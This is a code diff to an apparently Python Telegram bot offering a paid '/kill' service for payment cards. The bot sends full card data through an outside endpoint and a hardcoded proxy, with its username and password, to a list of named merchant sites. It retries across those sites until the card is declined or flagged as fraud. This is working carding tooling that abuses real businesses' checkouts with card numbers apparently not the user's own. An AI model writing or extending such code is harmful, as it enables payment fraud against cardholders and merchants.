@@ -2566,6 +2566,25 @@ KILL_API = (
     "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
 )
 
+FALLBACK_SITES = [
+    "therapyessentials.coraphysicaltherapy.com",
+    "lptmedical.com",
+    "bacteriostaticwater.com",
+    "divinebovinejerky.com",
+    "livelovespa.com",
+    "urbanspaceinteriors.com",
+]
+
+FALLBACK_ERRORS = [
+    "CLINTE TOKEN",
+    "R4 TOKEN EMPTY",
+    "TAX AMOUNT EMPTY",
+    "GENERIC_ERROR",
+    "DEL AMOUNT EMPTY",
+    "PRODUCT ID EMPTY",
+    "PY ID EMPTY"
+]
+
 COOLDOWN = 5                 # per-user cooldown seconds
 ANIM_STEP_DELAY = 0.7        # animation speed (seconds per char)
 CHECK_TIMES = 4              # how many times to check the API
@@ -2662,7 +2681,7 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
         # --- Initial message ---
         try:
             msg = await update.message.reply_text(
-                "<pre><code>𝙆𝙞𝙡𝙡𝙞𝙣𝗀 𝙄𝙣 𝙋𝗿𝗼𝙘𝗲𝙨𝙨⏳</code></pre>\n"
+                "<pre><code>𝙆𝙞𝙡𝙡𝙞𝗇𝗀 𝙄𝙣 𝙋𝗿𝗼𝙘𝗲𝙨𝙨⏳</code></pre>\n"
                 "𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝐊𝐢𝐥𝐥𝐞𝐫",
                 parse_mode=ParseMode.HTML,
                 disable_web_page_preview=True
@@ -2703,15 +2722,21 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
 
         anim_task = asyncio.create_task(_animate_loop(msg))
 
-        # --- Perform checks ---
-        api_url = KILL_API.format(full_card=cc)
+        # --- Prepare sites to try ---
+        sites_to_try = [KILL_API.format(full_card=cc)]
+        for site in FALLBACK_SITES:
+            sites_to_try.append(
+                f"https://rockyog.onrender.com/index.php?site={site}&cc={cc}&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+            )
+
+        # --- Perform API calls with fallback ---
         final_status = "❌ FAILED / TIMEOUT"
         display_response = "The card could not be killed."
 
         async with aiohttp.ClientSession() as session:
-            for attempt in range(CHECK_TIMES):
+            for site_url in sites_to_try:
                 try:
-                    async with session.get(api_url, timeout=55) as resp:
+                    async with session.get(site_url, timeout=55) as resp:
                         try:
                             data = await resp.json()
                         except Exception:
@@ -2725,15 +2750,23 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
                     continue
 
                 response = (data.get("Response") or "").upper()
+                message_text = (data.get("Message") or data.get("message") or "").upper()
 
-                # ✅ Only CARD_DECLINED or FRAUD_SUSPECTED counts as killed
+                # ✅ Success conditions
                 if response in ("CARD_DECLINED", "FRAUD_SUSPECTED"):
                     final_status = "✅ 𝗞𝗶𝗹𝗹𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆"
                     display_response = "Your card has been killed successfully."
-                    break  # stop further attempts
-                else:
-                    final_status = "❌ FAILED"
-                    display_response = data.get("Message") or data.get("message") or "Gateway returned an unrecoverable response."
+                    break
+
+                # ⚠️ Check if fallback needed
+                fallback_needed = any(err in response or err in message_text for err in FALLBACK_ERRORS)
+                if fallback_needed:
+                    continue  # try next site
+
+                # ❌ Non-fallback failure
+                final_status = "❌ FAILED"
+                display_response = message_text or "Gateway returned an unrecoverable response."
+                break
 
                 await asyncio.sleep(1)
 
@@ -2744,7 +2777,7 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
         except asyncio.CancelledError:
             pass
 
-        # --- Deduct 5 credits once ---
+        # --- Deduct 5 credits ---
         try:
             await consume_credit(user_id, 5)
         except Exception:
@@ -2785,6 +2818,7 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
         except Exception:
             pass
         print(f"[ERROR] /kill task failed: {e}")
+
 
 
 
